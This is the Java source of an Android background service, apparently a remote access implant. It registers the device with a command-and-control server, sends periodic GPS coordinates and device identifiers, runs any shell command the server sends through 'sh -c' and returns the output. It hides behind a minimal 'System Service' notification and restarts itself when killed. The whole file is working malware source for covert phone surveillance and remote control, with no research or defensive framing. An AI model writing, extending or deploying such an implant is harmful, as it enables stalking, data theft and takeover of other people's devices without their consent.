package com.bmu.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import org.json.JSONObject;

import java.io.IOException;
import java.util.UUID;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class AgentService extends Service {

    private static final String CHANNEL_ID = "agent_channel";
    private static final String PREFS_NAME = "agent_prefs";
    private static final String KEY_AGENT_ID = "agent_id";
    private static final String KEY_AGENT_TOKEN = "agent_token";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");

    private OkHttpClient httpClient;
    private Handler handler;
    private String agentId;
    private String agentToken;
    private boolean registered = false;

    private Runnable heartbeatRunnable;
    private Runnable taskPollRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .build();
        handler = new Handler(Looper.getMainLooper());

        // Charger ou générer l'ID agent
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        agentId = prefs.getString(KEY_AGENT_ID, null);
        agentToken = prefs.getString(KEY_AGENT_TOKEN, null);

        if (agentId == null) {
            agentId = UUID.randomUUID().toString().replace("-", "");
            prefs.edit().putString(KEY_AGENT_ID, agentId).apply();
        }

        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(1, buildNotification());

        // Enregistrement puis heartbeat + poll
        new Thread(() -> {
            register();
            startHeartbeat();
            startTaskPoll();
        }).start();

        return START_STICKY; // Redémarre automatiquement si tué
    }

    private void register() {
        try {
            JSONObject body = new JSONObject();
            body.put("id", agentId);
            body.put("token", Config.REGISTER_TOKEN);
            body.put("hostname", Build.MODEL);
            body.put("os", "Android " + Build.VERSION.RELEASE);
            body.put("osRelease", "Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
            body.put("ip", getLocalIp());
            body.put("agentVersion", "1.0");
            body.put("type", "android");

            // Infos appareil
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
            deviceInfo.put("sdkInt", Build.VERSION.SDK_INT);
            deviceInfo.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            body.put("deviceInfo", deviceInfo);

            Request request = new Request.Builder()
                    .url(Config.C2_URL + "/api/android/register")
                    .post(RequestBody.create(body.toString(), JSON))
                    .build();

            try (Response response = httpClient.newCall(request).execute()) {
                if (response.isSuccessful() && response.body() != null) {
                    String respStr = response.body().string();
                    JSONObject resp = new JSONObject(respStr);
                    if (resp.has("token")) {
                        agentToken = resp.getString("token");
                        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                                .edit().putString(KEY_AGENT_TOKEN, agentToken).apply();
                    }
                    registered = true;
                }
            }
        } catch (Exception e) {
            // Réessayer dans 30s
            handler.postDelayed(this::register, 30000);
        }
    }

    private void startHeartbeat() {
        heartbeatRunnable = new Runnable() {
            @Override
            public void run() {
                sendHeartbeat();
                handler.postDelayed(this, Config.HEARTBEAT_INTERVAL);
            }
        };
        handler.post(heartbeatRunnable);
    }

    private void sendHeartbeat() {
        if (agentToken == null) return;
        new Thread(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("id", agentId);

                // GPS
                Location loc = getLastLocation();
                if (loc != null) {
                    body.put("lat", loc.getLatitude());
                    body.put("lng", loc.getLongitude());
                }

                // Batterie
                body.put("battery", getBatteryLevel());

                Request request = new Request.Builder()
                        .url(Config.C2_URL + "/api/agents/heartbeat")
                        .addHeader("x-agent-token", agentToken)
                        .post(RequestBody.create(body.toString(), JSON))
                        .build();

                httpClient.newCall(request).execute().close();
            } catch (Exception ignored) {}
        }).start();
    }

    private void startTaskPoll() {
        taskPollRunnable = new Runnable() {
            @Override
            public void run() {
                pollTasks();
                handler.postDelayed(this, Config.TASK_POLL_INTERVAL);
            }
        };
        handler.post(taskPollRunnable);
    }

    private void pollTasks() {
        if (agentToken == null) return;
        new Thread(() -> {
            try {
                Request request = new Request.Builder()
                        .url(Config.C2_URL + "/api/agents/" + agentId + "/tasks/pending")
                        .addHeader("x-agent-token", agentToken)
                        .get()
                        .build();

                try (Response response = httpClient.newCall(request).execute()) {
                    if (response.isSuccessful() && response.body() != null) {
                        String body = response.body().string();
                        JSONObject resp = new JSONObject(body);
                        if (resp.has("tasks")) {
                            org.json.JSONArray tasks = resp.getJSONArray("tasks");
                            for (int i = 0; i < tasks.length(); i++) {
                                JSONObject task = tasks.getJSONObject(i);
                                executeTask(task);
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
        }).start();
    }

    private void executeTask(JSONObject task) {
        try {
            String taskId = task.getString("id");
            String type = task.optString("type", "");
            String payload = task.optString("payload", "{}");
            JSONObject payloadObj = new JSONObject(payload);

            String result = "";

            switch (type) {
                case "shell":
                    String cmd = payloadObj.optString("cmd", "");
                    result = executeShell(cmd);
                    break;
                case "sysinfo":
                    result = getSysInfo();
                    break;
                case "location":
                    Location loc = getLastLocation();
                    if (loc != null) {
                        JSONObject locObj = new JSONObject();
                        locObj.put("lat", loc.getLatitude());
                        locObj.put("lng", loc.getLongitude());
                        locObj.put("accuracy", loc.getAccuracy());
                        result = locObj.toString();
                    } else {
                        result = "{\"error\":\"GPS non disponible\"}";
                    }
                    break;
                default:
                    result = "{\"error\":\"Commande inconnue: " + type + "\"}";
            }

            // Envoyer le résultat
            sendTaskResult(taskId, result);

        } catch (Exception e) {
            try {
                sendTaskResult(task.optString("id", ""), "{\"error\":\"" + e.getMessage() + "\"}");
            } catch (Exception ignored) {}
        }
    }

    private String executeShell(String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            byte[] output = process.getInputStream().readAllBytes();
            byte[] error = process.getErrorStream().readAllBytes();
            process.waitFor();
            String out = new String(output).trim();
            String err = new String(error).trim();
            return out.isEmpty() ? err : out;
        } catch (Exception e) {
            return "Erreur: " + e.getMessage();
        }
    }

    private String getSysInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("model", Build.MODEL);
            info.put("androidVersion", Build.VERSION.RELEASE);
            info.put("sdkInt", Build.VERSION.SDK_INT);
            info.put("board", Build.BOARD);
            info.put("brand", Build.BRAND);
            info.put("device", Build.DEVICE);
            info.put("hardware", Build.HARDWARE);
            info.put("product", Build.PRODUCT);
            info.put("androidId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            info.put("battery", getBatteryLevel());
            info.put("ip", getLocalIp());

            // IMEI si permission accordée
            try {
                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    info.put("operator", tm.getNetworkOperatorName());
                    info.put("simState", tm.getSimState());
                }
            } catch (Exception ignored) {}

            return info.toString();
        } catch (Exception e) {
            return "{\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    private void sendTaskResult(String taskId, String result) {
        try {
            JSONObject body = new JSONObject();
            body.put("result", result);
            body.put("status", "completed");

            Request request = new Request.Builder()
                    .url(Config.C2_URL + "/api/agents/tasks/" + taskId + "/result")
                    .addHeader("x-agent-token", agentToken)
                    .post(RequestBody.create(body.toString(), JSON))
                    .build();

            httpClient.newCall(request).execute().close();
        } catch (Exception ignored) {}
    }

    private Location getLastLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return null;
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            return loc;
        } catch (Exception e) {
            return null;
        }
    }

    private int getBatteryLevel() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
            if (bm != null) return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception ignored) {}
        return -1;
    }

    private String getLocalIp() {
        try {
            java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                java.net.NetworkInterface iface = interfaces.nextElement();
                java.util.Enumeration<java.net.InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    java.net.InetAddress addr = addresses.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof java.net.Inet4Address) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "unknown";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("System service");
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeCallbacks(heartbeatRunnable);
            handler.removeCallbacks(taskPollRunnable);
        }
        // Auto-restart
        Intent restart = new Intent(getApplicationContext(), AgentService.class);
        startService(restart);
    }
}
